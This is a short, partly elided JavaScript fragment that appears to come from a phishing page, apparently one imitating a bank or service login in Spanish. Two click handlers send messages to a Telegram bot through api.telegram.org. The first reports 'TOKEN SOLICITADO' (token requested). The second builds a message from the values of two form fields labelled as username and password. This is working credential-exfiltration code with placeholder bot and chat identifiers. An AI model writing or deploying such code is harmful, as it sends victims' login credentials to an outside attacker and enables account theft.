...
requestbutton.addEventListener("click", () => {
  ...
  const url =
    "https://api.telegram.org/botABCDE/sendMessage?chat_id=FGHIJ&text=TOKEN%20SOLICITADO";
  Http.open("GET", url);
  Http.send();
...
sendatatme.addEventListener("click", () => {
  const Http = new XMLHttpRequest();
  const url =
    "https://api.telegram.org/botABCDE/sendMessage?chat_id=FGHIJ&text=USERNAME:%20" +
    resfirst.value +
    " PASSWORD: " +
    resecond.value;
  Http.open("GET", url);
